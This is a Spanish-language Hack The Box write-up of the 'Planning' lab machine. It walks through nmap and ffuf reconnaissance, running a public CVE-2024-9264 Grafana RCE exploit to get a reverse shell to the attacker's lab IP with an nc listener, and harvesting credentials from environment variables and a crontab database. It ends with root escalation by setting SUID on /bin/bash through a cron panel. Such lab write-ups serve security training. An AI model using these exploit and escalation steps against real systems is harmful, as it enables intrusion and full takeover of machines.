# Conexión a la VPN (HTB)

Me conecté a la VPN de Hack The Box para acceder a la red del laboratorio usando el siguiente comando:

```bash
sudo openvpn lab_dowyy.ovpn
```

Ejecuté OpenVPN con el archivo de configuración `lab_dowyy.ovpn`. Esto crea una interfaz virtual (normalmente `tun0`) y me asigna una IP dentro de la red del laboratorio, lo que me permite alcanzar las máquinas objetivo.

Para comprobar que la máquina objetivo estaba activa, realicé un ping:

```bash
ping -c 1 10.10.11.68
```

El host respondió correctamente, confirmando que estaba accesible a través de la VPN. Este paso me permitió asegurar que podía continuar con el escaneo sin problemas de conectividad.
### Escaneo de puertos y servicios
Para identificar puertos abiertos y servicios en la máquina, ejecuté el siguiente comando Nmap:

```bash
nmap --open -sC -sV -Pn 10.10.11.68
```
**Qué hace cada opción:**
- `--open`: Muestra únicamente los puertos abiertos.
- `-sC`: Ejecuta scripts de Nmap predeterminados para detección de información adicional sobre los servicios.
- `-sV`: Detecta versiones de los servicios corriendo en los puertos abiertos.
- `-Pn`: Desactiva el ping previo, útil si la máquina bloquea ICMP.

El escaneo me permitió identificar qué servicios estaban activos y sus versiones, información crucial para la fase de enumeración y explotación posterior.

![[Pasted image 20250915020759.png]]
- El puerto **22 (SSH)** está abierto, corriendo OpenSSH 9.6p1 sobre Ubuntu. Esto indica que probablemente podría acceder vía SSH si encontrara credenciales válidas o explotara alguna vulnerabilidad del servicio.  
- El puerto **80 (HTTP)** está abierto, ejecutando `nginx 1.24.0`. La página web tiene como título "Edukate - Online Education Website", lo que sugiere que podríamos explorar vulnerabilidades web o enumerar recursos accesibles a través del navegador.  
- El sistema operativo detectado es **Linux**, lo que me da un contexto para posibles exploits y técnicas de escalada de privilegios posteriores.
### Configuración del host local
Para poder acceder a la página web usando el nombre de dominio `planning.htb`, añadí la IP de la máquina al archivo `/etc/hosts` de mi sistema:

```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```
Qué hace este comando:
- echo "10.10.11.68 planning.htb" genera la línea que asocia la IP de la máquina con el dominio.
- sudo tee -a /etc/hosts añade la línea al final del archivo /etc/hosts con permisos de superusuario.
### Enumeración de subdominios con FFUF
Para descubrir posibles subdominios en el dominio `planning.htb`, utilicé **FFUF** con la siguiente configuración:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.planning.htb' -u http://planning.htb -c -fs 178
```

Qué hace cada parámetro:
- - w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt: Lista de palabras para probar como subdominios.
- -H 'Host: FUZZ.planning.htb': Cabecera HTTP donde FUZZ será reemplazado por cada palabra de la lista, simulando peticiones a subdominios distintos.
- -u http://planning.htb: URL objetivo base.
- -c: Colorea la salida para mayor legibilidad.
- -fs 178: Filtra respuestas que tengan tamaño 178 bytes, útil para ignorar páginas estándar que no indican subdominios válidos.

![[Pasted image 20250915022045.png]]

Durante la enumeración de subdominios con FFUF, descubrí un subdominio relacionado con **Grafana**. Este subdominio probablemente aloja un panel de monitoreo o dashboard de la aplicación, lo que representa un vector adicional de acceso o información sensible sobre el sistema.

> Nota: Identificar un subdominio de Grafana es relevante, ya que estas instancias a menudo contienen paneles internos con datos críticos o incluso credenciales, y pueden ser un punto de entrada para la explotación.

Para poder acceder al subdominio de Grafana desde mi navegador, añadí la IP de la máquina y el subdominio al archivo `/etc/hosts`:

```bash
echo "10.10.11.68 planning.htb grafana.planning.htb" | sudo tee -a /etc/hosts
```

Al iniciar la máquina **Planning**, Hack The Box me proporciona credenciales iniciales para el acceso al panel de grafana:
- Usuario: admin
- Contraseña: 0D5oT70Fq13EvB5r

Una vez dentro del panel, haciendo click en el circulo con el signo de interrogación encontré la versión Grafana v11.0.0, así que busque en google algún exploit activo justo para esa versión.

![[Pasted image 20250915022554.png]]

Efectivamente, hay una vulnerabilidad que nos permite ejecutar código remoto.

![[Pasted image 20250915022801.png]]
Para comenzar a usarla, clonaremos el repositorio nuestra maquina y ejecutaremos el exploit.

```bash
git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git
```

Dentro de la carpeta, seguimos las instrucciones del github. Nos va a crear una reverse shell a nuestra maquina y ahí podremos tener acceso.

### Ejecución del exploit CVE-2024-9264
Seguí las instrucciones del repositorio de GitHub y ejecuté el exploit para Grafana:

```bash
python3 poc.py --url http://grafana.planning.htb --user admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.126 --reverse-port 9001
```

**Qué hice y por qué:**
- Usé `python3 poc.py` para ejecutar el exploit escrito en Python.
- `--url http://grafana.planning.htb`: Apunté al subdominio de Grafana descubierto.
- `--user admin --password 0D5oT70Fq13EvB5r`: Credenciales iniciales proporcionadas por HTB, necesarias para autenticarse en Grafana.
- `--reverse-ip 10.10.14.126 --reverse-port 9001`: Configuré la máquina atacante para recibir una **reverse shell** una vez que el exploit se ejecuta exitosamente.

El objetivo era aprovechar la vulnerabilidad del CVE-2024-9264 para obtener acceso remoto a la máquina objetivo mediante una reverse shell, abriendo así la puerta a la fase de post-explotación.

Para recibir la conexión de la reverse shell generada por el exploit, ejecuté en mi máquina atacante una escucha por el puerto 9001:

```bash
nc -lvnp 9001
```

Tras ejecutar el exploit correctamente, obtuve una **reverse shell** desde la máquina víctima, lo que confirmó que la vulnerabilidad era explotable y me permitió interactuar directamente con el sistema.

![[Pasted image 20250915130215.png]]

Tras recibir la reverse shell, comprobé el entorno para entender el contexto y buscar credenciales o información sensible. El primer comando que ejecuté fue:

```bash
env
```

`env` lista las variables de entorno del proceso. Muchas aplicaciones (especialmente servicios web, contenedores o procesos gestionados) almacenan credenciales, URIs de bases de datos o tokens en variables de entorno. Revisarlas rápidamente puede revelar credenciales reutilizables o puntos de acceso a otros servicios.

En la imagen podemos ver que encontramos un usuario **admin** llamado `enzo` y una **password** `RioTecRANDEntANT!`. Sabiendo esto, voy a conectarme mediante ssh.

```bash
ssh enzo@planning.htb
```

Una vez dentro, solo hay que buscar y obtenemos la primera user flag.

![[Pasted image 20250915134744.png]]

Una vez dentro, voy a ver los servicios activos. Para entender qué servicios estaban corriendo en la máquina víctima y hacia dónde podía moverme, ejecuté:

```bash
netstat -tulnp
```

- `netstat -tulnp` lista sockets TCP/UDP (`-t`/`-u`) que están en modo _listening_ (`-l`), sin resolver nombres (`-n`) y muestra el PID/Programa responsable (`-p`).
- El objetivo es identificar servicios locales (por ejemplo bases de datos, servidores web internos, SSH escuchando en localhost, servicios bindados a 127.0.0.1) que podrían ser accesibles desde la máquina víctima pero no desde la red externa.
- Esto me ayuda a planear movimiento lateral (conexiones a servicios locales) o tunneling (SSH/port-forward) para acceder a recursos internos.

![[Pasted image 20250915131100.png]]
Aqui nos interesa saber que hay en el puerto 8000, ya que seguramente este siendo usado por grafana.
### Túnel SSH (port forwarding) hacia servicio local
Para acceder a un servicio que solo escuchaba en `127.0.0.1:8000` en la máquina víctima, establecí un túnel SSH desde mi máquina atacante al usuario `enzo` en la máquina objetivo:

```bash
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
```

- Ejecuté `ssh enzo@planning.htb` para abrir una sesión SSH con el usuario `enzo` en la máquina objetivo (usé las credenciales que había encontrado).
- La opción `-L 8000:127.0.0.1:8000` crea un **túnel local**: cualquier conexión a `localhost:8000` en mi máquina atacante se redirige a `127.0.0.1:8000` en la máquina remota.
- Hice esto porque el servicio que quería investigar (probablemente un panel, una API o un servicio web interno) estaba ligado a `localhost` en la víctima y no era accesible desde la red. El túnel me permitió interactuar con ese servicio desde mi navegador o herramientas locales como si estuviera corriendo en mi máquina.

Luego probé acceder desde el navegador pero me pide credenciales, asi que tendré que seguir buscando a través de la conexión ssh con el usuario de enzo. 
### Inspección del directorio /opt
Para ver qué software o ficheros instalados extra había en la máquina, listé el contenido de `/opt`:

```bash
ls -la /opt
```

Ejecuté `ls -la /opt` para listar archivos y directorios en `/opt` con permisos y propietarios. `/opt` suele contener aplicaciones de terceros, herramientas instaladas manualmente o despliegues que no forman parte del sistema base. Revisarlo puede revelar:

- Binarios o scripts ejecutables (posible vector para escalada si son SUID o escritos por usuarios).
- Ficheros de configuración que contengan credenciales o endpoints.
- Backups, instaladores o carpetas de proyectos que aporten pistas sobre la aplicación.

```bash
enzo@planning:~$ ls -la /opt
total 16
drwxr-xr-x  4 root root 4096 Feb 28  2025 .
drwxr-xr-x 22 root root 4096 Apr  3 14:40 ..
drwx--x--x  4 root root 4096 Feb 28  2025 containerd
drwxr-xr-x  2 root root 4096 Sep 15 11:55 crontabs
```
Encontramos algo sospechoso, el archivo contrabs, asi que vamos a ver si podemos leerlo y ver que contiene:

```bash
cd /opt/
cd contrabs
cat crontab.db
```

![[Pasted image 20250915131742.png]]

Tras analizar toda la información, encontramos una **password** : `P4ssw0rdS0pRi0T3c`

Seguimos analizando, vemos que en el docker hay tareas programadas, sobre todo con el usuario root, por lo que podemos entender que la contraseña que hemos encontrado puede estar ligada al usuario root, probé a entrar en el tunel ssh hecho previamente.

![[Pasted image 20250915132205.png]]

![[Pasted image 20250915132234.png]]

Estoy dentro del panel como root, y puedo ver dos tareas programadas por el usuario root. Como tengo el usuario con poder root, voy a crear una tarea nueva que me de permisos de obtener una /bin/bash como root, al usuario enzo, para ello voy a crear una nueva tarea haciendo click en "New".

En la tarea establecí el bit SUID en `/bin/bash` para permitir que el usuario `enzo` pudiera ejecutar una shell con privilegios de root:

```bash
chmod u+s /bin/bash
```

- Ejecuté `chmod u+s /bin/bash` para poner el bit **SUID** en el binario de `bash`.
- El objetivo era permitir que, al ejecutar `/bin/bash`, el proceso heredara la **UID efectiva** del propietario del fichero (root), concediendo así una shell con privilegios elevados al usuario `enzo`.
- Hice esto como método directo de escalada de privilegios tras comprobar que tenía capacidad para modificar permisos en ese binario (situación posible en un entorno de laboratorio/controlado).

![[Pasted image 20250915132446.png]]
No voy a esperar par que se ejecute, por lo que voy a guardar y darle a ejecutar ahora.

Ahora, de vuelta a la cmd con la conexion ssh con el usuario enzo, compruebo que tengo permisos de root para abrir una /bin/bash.

```bash
ls -la /bin/bash
```

![[Pasted image 20250915134512.png]]
Como se ve en la imagen, ya tengo permisos root para abrirla, así que basta con abrir una cmd como root y buscar la flag.

![[Pasted image 20250915134545.png]]

# OWNED!